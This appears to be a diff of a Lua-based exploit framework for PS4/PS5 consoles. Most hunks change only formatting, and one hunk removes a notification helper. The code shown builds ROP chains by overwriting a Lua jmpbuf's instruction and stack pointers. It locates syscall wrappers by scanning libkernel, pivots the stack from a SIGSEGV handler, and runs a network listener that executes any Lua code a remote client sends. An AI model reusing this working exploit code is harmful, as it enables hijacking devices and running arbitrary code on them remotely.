-        local jmpbuf_addr = lua.read_qword(lua_state_addr + 0xa8) + 0x8
+        local jmpbuf_addr = lua.read_qword(lua_state_addr+0xa8) + 0x8
         lua.memcpy(self.jmpbuf_backup, jmpbuf_addr, self.jmpbuf_size)
 
         -- overwrite registers in jmpbuf
-        lua.write_qword(jmpbuf_addr + 0, gadgets["ret"])   -- rip
-        lua.write_qword(jmpbuf_addr + 16, self.stack_base) -- rsp
+        lua.write_qword(jmpbuf_addr + 0, gadgets["ret"])    -- rip
+        lua.write_qword(jmpbuf_addr + 16, self.stack_base)  -- rsp
 
         assert(false) -- trigger exception
     end
@@ -1710,34 +1745,36 @@ function ropchain:execute_rop()
 
     -- reset placeholder for next invocation
     self.placeholder_value = {}
-
+    
     -- get return value(s)
     return unpack(self:get_retval())
 end
 
 -- reset ropchain from backup and apply placeholder values
 function ropchain:reset_chain()
+
     local total, count = 0, 0
 
     -- expected number of placeholders
-    for n, t in pairs(self.placeholder) do
+    for n,t in pairs(self.placeholder) do 
         total = total + #t
     end
 
     local chains = lua.read_multiple_qwords(self.stack_backup, self:chain_size() / 8)
-
+    
     -- patch ropchain with placeholder values
-    for offset, value in pairs(self.placeholder_value) do
-        chains[offset / 8 + 1] = value
+    for offset,value in pairs(self.placeholder_value) do
+        chains[offset/8 + 1] = value
         count = count + 1
     end
 
     assert(total == count, "there are some unresolved placeholders in rop chain")
-
+    
     lua.write_multiple_qwords(self.stack_base, chains)
 end
 
 function ropchain:execute()
+    
     if not self.finalized then
         -- restore execution through longjmp
         self:push_fcall(libc_addrofs.longjmp, self.jmpbuf_backup, 0)
@@ -1748,9 +1785,13 @@ function ropchain:execute()
 
     self:reset_chain()
     -- print(self) -- uncomment to show finalized ropchain
-
+    
     return self:execute_rop()
 end
+
+
+
+
 
 --
 -- function rop class
@@ -1762,12 +1803,13 @@ function_rop = {}
 function_rop.__index = function_rop
 
 setmetatable(function_rop, {
-    __call = function(_, address) -- make class callable as constructor
+    __call = function(_, address)  -- make class callable as constructor
         return function_rop:new(address)
     end
 })
 
 function function_rop:new(address)
+
     assert(address, "invalid function address")
 
     -- use one ropchain for all syscall instances (thread unsafe)
@@ -1790,8 +1832,8 @@ function function_rop:new(address)
 end
 
 function function_rop:__call(rdi, rsi, rdx, rcx, r8, r9)
-    function_rop.chain:write_value_into_placeholder("sysv", { rdi, rsi, rdx, rcx, r8, r9 })
-    function_rop.chain:write_value_into_placeholder("address", { self.address })
+    function_rop.chain:write_value_into_placeholder("sysv", {rdi,rsi,rdx,rcx,r8,r9})
+    function_rop.chain:write_value_into_placeholder("address", {self.address})
     return select(1, function_rop.chain:execute())
 end
 
@@ -1799,9 +1841,13 @@ function function_rop:__tostring()
     return string.format("address @ %s\n%s", hex(self.address), tostring(function_rop.chain))
 end
 
+
+
+
+
 --
 -- syscall rop class
---
+-- 
 -- helper to execute syscall through rop
 --
 
@@ -1809,12 +1855,13 @@ syscall_rop = {}
 syscall_rop.__index = syscall_rop
 
 setmetatable(syscall_rop, {
-    __call = function(_, syscall_no) -- make class callable as constructor
+    __call = function(_, syscall_no)  -- make class callable as constructor
         return syscall_rop:new(syscall_no)
     end
 })
 
 function syscall_rop:new(syscall_no)
+
     assert(syscall_no and type(syscall_no) == "number", "invalid syscall number")
     assert(syscall_rop.syscall_address, "syscall_rop will not work without syscall_address")
 
@@ -1835,19 +1882,23 @@ function syscall_rop:new(syscall_no)
 
     local self = setmetatable({}, syscall_rop)
     self.syscall_no = syscall_no
-
+    
     return self
 end
 
 function syscall_rop:__call(rdi, rsi, rdx, rcx, r8, r9)
-    syscall_rop.chain:write_value_into_placeholder("sysv", { rdi, rsi, rdx, rcx, r8, r9 })
-    syscall_rop.chain:write_value_into_placeholder("syscall_no", { self.syscall_no })
+    syscall_rop.chain:write_value_into_placeholder("sysv", {rdi,rsi,rdx,rcx,r8,r9})
+    syscall_rop.chain:write_value_into_placeholder("syscall_no", {self.syscall_no})
     return select(1, syscall_rop.chain:execute())
 end
 
 function syscall_rop:__tostring()
     return string.format("syscall no @ %s\n%s", hex(self.syscall_no), tostring(syscall_rop.chain))
 end
+
+
+
+
 
 --
 -- syscall class
@@ -1858,18 +1909,18 @@ end
 syscall = {}
 
 function syscall.init()
-    if PLATFORM == "ps4" then -- ps4 requires valid syscall wrapper, which we can scrape from libkernel .text
+    if PLATFORM == "ps4" then  -- ps4 requires valid syscall wrapper, which we can scrape from libkernel .text
         local libkernel_text = memory.read_buffer(libkernel_base, 0x40000)
         -- mov rax, <num>; mov r10, rcx; syscall
         local matches = find_pattern(libkernel_text, "48 c7 c0 ? ? ? ? 49 89 ca 0f 05")
         syscall.syscall_wrapper = {}
-        for i, offset in ipairs(matches) do
-            local num = uint64.unpack(libkernel_text:sub(offset + 3, offset + 6))
+        for i,offset in ipairs(matches) do
+            local num = uint64.unpack(libkernel_text:sub(offset+3, offset+6))
             syscall.syscall_wrapper[num:tonumber()] = libkernel_base + offset - 1
         end
-    elseif PLATFORM == "ps5" then  -- can be any syscall wrapper in libkernel
+    elseif PLATFORM == "ps5" then -- can be any syscall wrapper in libkernel
         local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
-        syscall_rop.syscall_address = gettimeofday + 7 -- +7 is to skip "mov rax, <num>" instruction
+        syscall_rop.syscall_address = gettimeofday + 7  -- +7 is to skip "mov rax, <num>" instruction
         WRITE_ADDR = syscall_rop.syscall_address
     else
         errorf("invalid platform %s", PLATFORM)
@@ -1894,51 +1945,13 @@ function syscall.resolve(list)
     end
 end
 
-sceKernelSendNotificationRequest__Address = nil
-function locate_notify()
-    if PLATFORM == "ps4" then
-        local libkernel_text = memory.read_buffer(libkernel_base, 0x40000)
-        local matches = find_pattern(libkernel_text, "55 48 89 E5 41 57 41 56 41 54 53 49 89 F4")
-        for i, offset in ipairs(matches) do
-            sceKernelSendNotificationRequest__Address = libkernel_base:tonumber() + offset - 1
-            printf("%x\n", sceKernelSendNotificationRequest__Address)
-        end
-    end
-end
 
-function sceKernelSendNotificationRequestFn(a1, buffer, size, a4)
-    local sceKernelSendNotificationRequestAddr = function_rop(sceKernelSendNotificationRequest__Address)
-    if sceKernelSendNotificationRequestAddr(a1, buffer, size, a4):tonumber() ~= 0 then
-        error("sceKernelSendNotificationRequest() error! Address may be wrong.")
-        return nil
-    end
-end
 
-function sceKernelSendNotificationRequest(text)
-    if PLATFORM == "ps4" then
-        if sceKernelSendNotificationRequest__Address == nil then
-            locate_notify()
-        end
-        if sceKernelSendNotificationRequest__Address ~= nil then
-            local size = 3120
-            local notification = bump.alloc(3121)
-            local icon_uri = "cxml://psnotification/tex_icon_system"
-
-            -- credits to OSM-Made for this one. @ https://github.com/OSM-Made/PS4-Notify
-            memory.write_dword(notification + 0, 0)            -- type
-            memory.write_dword(notification + 0x28, 0)         -- unk3
-            memory.write_dword(notification + 0x2C, 1)         -- use_icon_image_uri
-            memory.write_dword(notification + 0x10, -1)        -- target_id
-            memory.write_buffer(notification + 0x2D, text .. "\0") -- message
-            memory.write_buffer(notification + 0x42D, icon_uri) -- uri
-            sceKernelSendNotificationRequestFn(0, notification, size, 0)
-        end
-    end
-end
 
 -- todo: figure out a way to write to socket directly for realtime output
 -- todo: capture memory error and pass to client (sigsegv)
 function run_lua_code(lua_code)
+
     local script, err = loadstring(lua_code)
     if not script then
         return "error loading script: " .. err
@@ -1982,21 +1995,22 @@ function get_error_string()
 end
 
 function remote_lua_loader(port)
+
     assert(port)
 
     AF_INET = 2
     SOCK_STREAM = 1
     INADDR_ANY = 0
 
-    SOL_SOCKET = 0xffff -- options for socket level
-    SO_REUSEADDR = 4    -- allow local address reuse
+    SOL_SOCKET = 0xffff  -- options for socket level
+    SO_REUSEADDR = 4  -- allow local address reuse
 
     local enable = bump.alloc(4)
     local sockaddr_in = bump.alloc(16)
     local addrlen = bump.alloc(8)
     local tmp = bump.alloc(8)
 
-    local maxsize = 500 * 1024 -- 500kb
+    local maxsize = 500 * 1024  -- 500kb
     local buf = bump.alloc(maxsize)
 
     local sock_fd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
@@ -2022,40 +2036,42 @@ function remote_lua_loader(port)
     if syscall.bind(sock_fd, sockaddr_in, 16):tonumber() < 0 then
         error("bind() error: " .. get_error_string())
     end
-
+ 
     if syscall.listen(sock_fd, 3):tonumber() < 0 then
         error("listen() error: " .. get_error_string())
     end
 
     notify(string.format("remote lua loader\nrunning on %s %s\nlistening on port %d",
         PLATFORM, FW_VERSION, port))
-
+        
     -- setup signal handler
     signal_handler()
 
     while true do
-        print("[+] waiting for new connection...")
 
+        print("[+] waiting for new connection...")
+        
         memory.write_dword(addrlen, 16)
-        local client_fd = syscall.accept(sock_fd, sockaddr_in, addrlen):tonumber()
+        local client_fd = syscall.accept(sock_fd, sockaddr_in, addrlen):tonumber()  
         if client_fd < 0 then
             error("accept() error: " .. get_error_string())
         end
-
+ 
         syscall.read(client_fd, tmp, 8)
         local size = memory.read_qword(tmp):tonumber()
-
+        
         printf("[+] accepted new connection client fd %d", client_fd)
 
-        if size > 0 and size < maxsize then
+        if size > 0 and size < maxsize then            
+            
             syscall.read(client_fd, buf, size)
             local lua_code = memory.read_buffer(buf, size)
-
+            
             printf("[+] accepted lua code with size %d (%s)", #lua_code, hex(#lua_code))
-
+            
             -- write to signal handler
             signal_handler_rop(client_fd)
-
+            
             local output = run_lua_code(lua_code)
             syscall.write(client_fd, output, #output)
         else
@@ -2076,10 +2092,11 @@ function get_module_name(addr)
     if sceKernelGetModuleInfoFromAddr(addr, 1, buf):tonumber() ~= 0 then
         return nil
     end
-    return memory.read_null_terminated_string(buf + 8)
+    return memory.read_null_terminated_string(buf+8)
 end
 
 function resolve_libkernel_hacky()
+
     local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
     local base = gettimeofday:band(uint64(0xfff):bnot())
     local page_size = 0x1000
@@ -2095,6 +2112,7 @@ function resolve_libkernel_hacky()
 end
 
 function sysctlbyname(name, oldp, oldp_len, newp, newp_len)
+    
     local translate_name_mib = bump.alloc(0x8)
     local buf_size = 0x70
     local mib = bump.alloc(buf_size)
@@ -2102,7 +2120,7 @@ function sysctlbyname(name, oldp, oldp_len, newp, newp_len)
 
     memory.write_qword(translate_name_mib, 0x300000000)
     memory.write_qword(size, buf_size)
-
+    
     if syscall.sysctl(translate_name_mib, 2, mib, size, name, #name):tonumber() < 0 then
         errorf("failed to translate sysctl name to mib (%s)", name)
     end
@@ -2115,6 +2133,7 @@ function sysctlbyname(name, oldp, oldp_len, newp, newp_len)
 end
 
 function get_version()
+
     local version = nil
 
     local buf = bump.alloc(0x8)
@@ -2122,8 +2141,8 @@ function get_version()
     memory.write_qword(size, 0x8)
 
     if sysctlbyname("kern.sdk_version", buf, size, 0, 0) then
-        local ver = memory.read_buffer(buf + 2, 2)
-        version = string.format('%x.%02x', string.byte(ver:sub(2, 2)), string.byte(ver:sub(1, 1)))
+        local ver = memory.read_buffer(buf+2, 2)
+        version = string.format('%x.%02x', string.byte(ver:sub(2,2)), string.byte(ver:sub(1,1)))
     end
 
     return version
@@ -2134,15 +2153,15 @@ function sigaction(signum, action, old_action)
     MAP_FIXED = 0x10
     MAP_ANONYMOUS = 0x1000
     MAP_COMBINED = bit32.bor(MAP_PRIVATE, MAP_FIXED, MAP_ANONYMOUS)
-
+    
     PROT_READ = 0x1
     PROT_WRITE = 0x2
     PROT_COMBINED = bit32.bor(PROT_READ, PROT_WRITE)
-
-    if syscall.mmap(0xfb000000, 0x1000, PROT_COMBINED, MAP_COMBINED, -1, 0):tonumber() < 0 then
+    
+    if syscall.mmap(0xfb000000, 0x1000, PROT_COMBINED, MAP_COMBINED, -1 ,0):tonumber() < 0 then
         error("mmap() error: " .. get_error_string())
     end
-
+    
     if syscall.sigaction(signum, action, old_action):tonumber() < 0 then
         error("sigaction() error: " .. get_error_string())
     end
@@ -2154,18 +2173,18 @@ function signal_handler()
     local SIGSEGV = 11
     print("Setting signal handler\n")
     local sigaction_struct = bump.alloc(0x8)
-
+    
     memory.write_qword(sigaction_struct, gadgets["mov esp, 0xfb0000bd; ret"]) -- sigaction.sa_handler
-
+    
     sigaction(SIGSEGV, sigaction_struct, 0)
 end
 
 function signal_handler_rop(client_fd)
     output = bump.alloc(0x8)
-
+    
     -- TODO: restore execution correctly instead of crash
     local chain = ropchain(0x500, 0x100, 0xfb0000bd - 0x8)
-
+    
     chain:push_set_rdi(ropchain.resolve_value(client_fd))
     chain:push_set_rsi(ropchain.resolve_value(output))
     chain:push_set_rdx(ropchain.resolve_value(#output))
@@ -2177,6 +2196,7 @@ function signal_handler_rop(client_fd)
 end
 
 function main()
+
     -- setup read & limited write primitives
     lua.setup_primitives()
 
@@ -2191,7 +2211,7 @@ function main()
 
     syscall.init()
 
-    -- resolve required syscalls for remote lua loader
+    -- resolve required syscalls for remote lua loader 
     syscall.resolve({
         read = 3,
         write = 4,
